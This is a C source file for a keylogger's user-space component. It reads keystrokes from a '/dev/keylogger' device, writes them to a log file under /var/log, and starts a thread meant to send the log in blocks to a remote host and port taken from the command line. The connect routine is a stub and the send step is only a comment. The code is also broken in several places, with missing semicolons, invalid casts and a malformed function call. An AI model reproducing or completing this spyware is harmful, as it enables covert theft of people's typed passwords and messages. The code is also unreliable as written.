#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/select.h>
#include <string.h>

#ifndef FALLOC_FL_COLLAPSE_RANGE
#define FALLOC_FL_COLLAPSE_RANGE 0x08
#endif

#define BUFFER_SIZE 128

typedef struct address
{
    char *host;
    int port;
};

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

int connect(char *host, int port)
{
    /* try to connect to server, if ok return 0 else -1*/
    return -1;
}

void sendToServer(void *args)
{
    struct address addr = (struct address) *args;
    int connected = 0;
    unsigned char buffer[BUFFER_SIZE];

    printf("Startuje\n");
    while(1)
    {
        if (connected)
        {
            /* we are connected to server send log file*/
            pthread_mutex_lock(&mutex);
            int fd = open("/var/log/keylogger.log", O_CREAT | O_TRUNC | O_RDWR, 0644);
            int readBytes = 0;
            while (readBytes < BUFFER_SIZE)
            {
                readBytes += read(fd, buffer + readBytes, BUFFER_SIZE - readBytes)
            }
            fclose(fd);
            pthread_mutex_unlock(&mutex);
            /* send buffer to server */

            /* if send succeeded delete block of data in log file */
            pthread_mutex_lock(&mutex);
            fallocate(fd, FALLOC_FL_COLLAPSE_RANGE, 0, BUFFER_SIZE);
            pthread_mutex_unlock(&mutex);
            /* if send does not succeeded leave file as it was and set connected to 0 */
        }
        else if (connect(char *host, int port) == 0)
        {
            connected = 1;
        }

        sleep(5)
    }
}

void logToFile(unsigned char *buffer, int *currentSize)
{
    pthread_mutex_lock(&mutex);
    FILE *file  = fopen("/var/log/keylogger.log", "a+");
    int writtenBytes = 0;
    while (*currentSize - writtenBytes > 0)
    {
        writtenBytes += fwrite(buffer + writtenBytes, 1, *currentSize - writtenBytes, file)
    }
    *currentSize = 0
    fclose(file);
    pthread_mutex_unlock(&mutex);
}


int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        fprintf(stderr, "Incorrect number of arguments\n");
        return 1;
    }

    struct address addr;
    addr.host = argv[1];
    addr.port = atoi(argv[2]);

    int dev_fd;
    if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1)
    {
        fprintf(stderr, "Cannot open device\n");
        return 2;
    }

    unsigned char buffer[BUFFER_SIZE];
    int currentSize = 0;

    pthread_t sender;
    if (pthread_create(&sender, NULL, &sendToServer, (void *)&addr) != 0)
    {
        fprintf(stderr, "Cannot create thread\n");
        return 3;
    }


    while (1)
    {
        int readBytes;
        if ((readBytes = read(dev_fd, buffer + currentSize, BUFFER_SIZE - currentSize)) == -1)
        {
            fprintf(stderr, "Error reading device\n");
            close(dev_fd);
            exit(3);
        }

        currentSize += readBytes;
        printf("Read %d bytes\n", readBytes);

        if (currentSize == BUFFER_SIZE)
         {
             logToFile(buffer, &currentSize);
         }
    }
}
